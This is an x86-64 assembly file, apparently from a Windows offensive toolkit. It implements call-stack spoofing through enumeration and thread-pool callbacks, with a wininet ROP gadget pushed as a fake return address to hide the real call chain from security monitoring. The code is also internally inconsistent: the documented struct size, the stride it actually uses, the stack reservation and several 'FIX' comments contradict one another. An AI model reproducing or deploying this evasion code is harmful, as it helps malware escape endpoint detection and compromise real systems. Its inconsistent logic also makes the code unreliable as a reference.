.data

    .globl GCONTEXT
    .globl GINDEX
    .globl GCCTX
    .globl GLOCK

GCONTEXT: .quad 0
GINDEX:   .quad 0
GCCTX:    .quad 0
GLOCK:    .quad 0


    .text
    .globl GetReturn
    .globl FirstCallback
    .globl GenericCallback
    .globl LastCallback
    .globl StackSmashingCallback


# =============================================================================
# WorkItemContext memory layout   (Callback.h + ApiHashing.cpp must match)
#
#   Offset   Field
#   +0       func        ptr (8 b)   – function pointer (or &ctx->func for workItems[2])
#   +8       retAddress  ptr (8 b)   – wininet gadget address / result write-back slot
#   +16      argc        u64 (8 b)   – number of arguments
#   +24      args[0]     ptr (8 b)
#   +32      args[1]
#   ...
#   +136     args[14]
#
#   sizeof = 8 + 8 + 8 + 15*8 = 144 = 0x90 bytes   → stride between entries = 144
#
# =============================================================================
# do_call STACK FRAME   (RSP at jmp into target function = "target_RSP")
#
#   target_RSP + 0x00   retAddress  (wininet gadget)          ← pushq %r12
#   target_RSP + 0x08   shadow1 / rcx                         ┐
#   target_RSP + 0x10   shadow2 / rdx                         │ subq $0x80
#   target_RSP + 0x18   shadow3 / r8                          │ block
#   target_RSP + 0x20   shadow4 / r9                          │ (128 bytes)
#   target_RSP + 0x28   args[4]   (5th arg, first stack arg)  │
#   target_RSP + 0x30   args[5]                               │
#   ...                                                        │
#   target_RSP + 0x78   args[14]  (15th arg, last stack arg)  ┘
#   target_RSP + 0x88   saved rbx                             ← pushq %rbx
#   target_RSP + 0x90   LastCallback caller return address    ← caller's frame
#
# Alignment:  callback entry RSP mod 16 = 8
#             after pushq %rbx:    RSP mod 16 = 0
#             after subq  $0x80:   RSP mod 16 = 0   (128 mod 16 = 0)
#             after pushq %r12:    RSP mod 16 = 8  ✓  (correct for jmp tail-call)
#
# Gadget unwind  "ADD RSP, 0x80 ; POP RBX ; RET":
#   after target ret  : RSP = target_RSP + 8   = RSP_entry - 0x88
#   ADD RSP, 0x80     : RSP = RSP_entry - 0x88 + 0x80 = RSP_entry - 8
#   POP RBX           : rbx ← [RSP_entry - 8]  = saved rbx            ✓
#   RET               : jmp  [RSP_entry]        = caller return addr   ✓
#
# Gadget bytes:  48 81 C4 80 00 00 00   ADD RSP, 0x80   (7-byte imm32 form)
#                5B                     POP RBX
#                C3                     RET
# NOTE: "48 83 C4 80" encodes ADD RSP, -128 (sign-extended imm8).  Use the
#       7-byte imm32 form above.  PatternSearch.cpp must search for this.
# =============================================================================


GetReturn:
    ret


FirstCallback:
    movq %rdx, GCONTEXT(%rip)
    movq $0,   GINDEX(%rip)
    movq $0,   GLOCK(%rip)
    jmp  GenericCallback


# =============================================================================
# GenericCallback
#
# Called by Windows (EnumThreadWindows / K32EnumPageFilesW / InitOnceExecuteOnce
# …) as an enumeration callback.  Dispatches to workItems[GINDEX].func via a
# tail-call so the spoofed chain remains invisible in the call stack.
#
# For NumArgs > 4 the stack args are written to (%rsp + 0x28+) relative to the
# current RSP, which is valid because the tail-call `jmp *%rax` does not modify
# RSP, so the target function sees the same RSP the Windows API caller set up.
# The caller (Windows) always leaves sufficient stack headroom.
# =============================================================================
GenericCallback:

    # offset = GINDEX × 56 (stride = sizeof WorkItemContext)
    movq GINDEX(%rip), %rax
    movq $56,         %rdx          # FIX: was $56 — stride must match struct size
    imulq %rdx, %rax

    movq GCONTEXT(%rip), %rdx
    addq %rax, %rdx

    movq %rdx, GCCTX(%rip)
    movq %rdx, %r10

    movq (%rdx),   %rax              # func ptr
    movq 16(%rdx), %r11              # argc

    cmpq $15, %r11
    jg   generic_skip_call

    cmpq $0, %r11
    jle  generic_do_call

    movq 24(%r10), %rcx
    cmpq $1, %r11
    jle  generic_do_call

    movq 32(%r10), %rdx
    cmpq $2, %r11
    jle  generic_do_call

    movq 40(%r10), %r8
    cmpq $3, %r11
    jle  generic_do_call

    movq 48(%r10), %r9
    cmpq $4, %r11
    jle  generic_do_call


generic_do_call:
    movq GINDEX(%rip), %r11
    incq %r11
    movq %r11, GINDEX(%rip)
    jmp  *%rax


generic_skip_call:
    movq GINDEX(%rip), %r11
    incq %r11
    movq %r11, GINDEX(%rip)
    ret


# =============================================================================
# LastCallback
#
# Called by the penultimate Windows API (EnumObjects / EnumFontFamiliesW /
# EnumUILanguagesW …) as a callback.  Sets up and tail-calls the ACTUAL target
# function stored in workItems[GINDEX].
#
# rbx is set to &workItems[0].retAddress before the jmp.  The wininet gadget
# (fake return address) writes RAX into [rbx] after the target returns, storing
# the result for ProxyPooling to read back as workItems[0].retAddress.
# =============================================================================
LastCallback:

    movq GLOCK(%rip), %rax
    cmpq $1, %rax
    je   skip_call

    movq $1, GLOCK(%rip)

    # offset = GINDEX × 56
    movq GINDEX(%rip), %rax
    movq $56,         %rdx          # FIX: was $56
    imulq %rdx, %rax

    movq GCONTEXT(%rip), %rdx
    addq %rax, %rdx

    movq %rdx, GCCTX(%rip)
    movq %rdx, %r10

    # workItems[last].func = &ctx->func  →  double-deref to get actual fn ptr
    movq (%rdx), %rax
    movq (%rax), %rax

    movq 16(%r10), %r11              # r11 = NumArgs

    cmpq $4, %r11
    jg   skip_call

    # Load register args (first 4); fall through to do_call for any remainder.
    cmpq $0, %r11
    jle  do_call

    movq 24(%r10), %rcx
    cmpq $1, %r11
    jle  do_call

    movq 32(%r10), %rdx
    cmpq $2, %r11
    jle  do_call

    movq 40(%r10), %r8
    cmpq $3, %r11
    jle  do_call

    movq 48(%r10), %r9
    # NumArgs > 4: fall through — stack args are handled inside do_call AFTER
    # RSP is in its final position so offsets are correct.


do_call:
    # ── Step 1: save retAddress without clobbering r10 (struct pointer) ────
    # r10 must remain valid for the stack-arg loop below.
    movq 8(%r10), %r12              # r12 = workItems[last].retAddress (wininet gadget)

    # ── Step 2: build the target-function stack frame ───────────────────────
    pushq %rbx                      # save non-volatile rbx; RSP_entry − 8
    subq  $0x20, %rsp               # FIX: was $32.  Provides room for:
                                    #   shadow (0x20) + 11 stack args (0x58) + pad (0x08)
                                    #   RSP = RSP_entry − 0x88
    pushq %r12                      # push gadget as fake return address
                                    #   RSP = RSP_entry − 0x90  ← target_RSP  (mod 16 = 8 ✓)

    # ── Step 3: write stack args AFTER RSP is finalised ─────────────────────
    # Now RSP = target_RSP.  Target function expects arg[4] at RSP+0x28, etc.
    # r10 is still the struct pointer; r11 is still NumArgs.
    # FIX: old code wrote to 40(%rsp) with a fixed offset BEFORE the frame
    # setup, so the values ended up at wrong RSP-relative positions, and r12
    # was reset inside the loop so only args[4] was ever read.
    cmpq $4, %r11
    jle  do_call_dispatch

    movq $5,  %r13          # r13: current 1-based arg index (5 = args[4])
    movq $56, %r12          # r12: struct offset of args[4] = 24 + 4×8 = 56
    movq $40, %r14          # r14: RSP offset (RSP+0x28 = RSP+40) for 5th arg

do_stack_loop:
    movq (%r10,%r12,1), %r15
    movq %r15, (%rsp,%r14,1)

    cmpq %r11, %r13         # AT&T: r13 − r11.  je when r13 == r11 (all written)
    je   do_call_dispatch   # FIX: was jle

    incq %r13
    addq $8, %r12
    addq $8, %r14
    jmp  do_stack_loop


do_call_dispatch:
    # ── Step 4: set rbx for wininet gadget result capture ───────────────────
    movq GCONTEXT(%rip), %rbx
    addq $8, %rbx                   # rbx = &workItems[0].retAddress

    jmp  *%rax                      # tail-call target function


skip_call:
    movq $0, %rax
    ret


StackSmashingCallback:
    # rcx = PTP_CALLBACK_INSTANCE (ignore)
    # rdx = PVOID Context  ← our struct pointer
    # r8  = PTP_WORK       (ignore)

    movq %rdx, GCONTEXT(%rip)
    movq $0,   GINDEX(%rip)
    movq $0,   GLOCK(%rip)

    # Compute &ctx[GINDEX]  (GINDEX is 0 here, so just use rdx directly)
    movq %rdx, %r10                  # r10 = context struct ptr (volatile, ok)
    movq %r10, GCCTX(%rip)

    movq  (%r10), %rax               # func ptr — save early, rax is volatile
    movq 16(%r10), %r11              # argc     — r11 is volatile on Windows

    cmpq $6, %r11
    jg   smash_skip_call

    cmpq $0, %r11
    jle  smash_do_call

    movq 24(%r10), %rcx              # args[0]
    cmpq $1, %r11
    jle  smash_do_call

    movq 32(%r10), %rdx              # args[1]
    cmpq $2, %r11
    jle  smash_do_call

    movq 40(%r10), %r8               # args[2]
    cmpq $3, %r11
    jle  smash_do_call

    movq 48(%r10), %r9               # args[3]
    cmpq $4, %r11
    jle  smash_do_call

    # Stack args: args[4] and args[5]
    # Use only volatile regs: r10 (ctx), r11 (argc), rax (func ptr)
    # Temporarily stash func ptr — we need rax free as scratch
    # r10 still = ctx ptr

    movq 56(%r10), %r11              # args[4] value
    movq %r11, 40(%rsp)              # -> [rsp+0x28] (5th param slot)

    movq 16(%r10), %r11              # reload argc
    cmpq $5, %r11
    jle  smash_do_call

    movq 64(%r10), %r11              # args[5] value
    movq %r11, 48(%rsp)              # -> [rsp+0x30] (6th param slot)

    movq 16(%r10), %r11
    cmpq $6, %r11
    jle  smash_do_call

    movq 72(%r10), %r11              # args[6] value
    movq %r11, 56(%rsp)              # -> [rsp+0x38] (7th param slot)

    movq 16(%r10), %r11
    cmpq $7, %r11
    jle  smash_do_call

    movq 80(%r10), %r11              # args[7] value
    movq %r11, 64(%rsp)              # -> [rsp+0x40] (8th param slot)

    movq  (%r10), %rax               # reload func ptr (r10 still valid)
    movq 16(%r10), %r11              # reload argc (not needed now, but clean)

smash_do_call:
    # rax = func ptr
    # rcx/rdx/r8/r9 = args[0..3]
    # [rsp+40],[rsp+48] = args[4..5]
    # [rsp+0] = ntdll return address  ← the spoof
    # Shadow space [rsp+8..+32] already there from ntdll's call to us

    movq GINDEX(%rip), %r11
    incq %r11
    movq %r11, GINDEX(%rip)

    jmp  *%rax                       # tail-call: target returns to ntdll

smash_skip_call:
    movq GINDEX(%rip), %r11
    incq %r11
    movq %r11, GINDEX(%rip)
    ret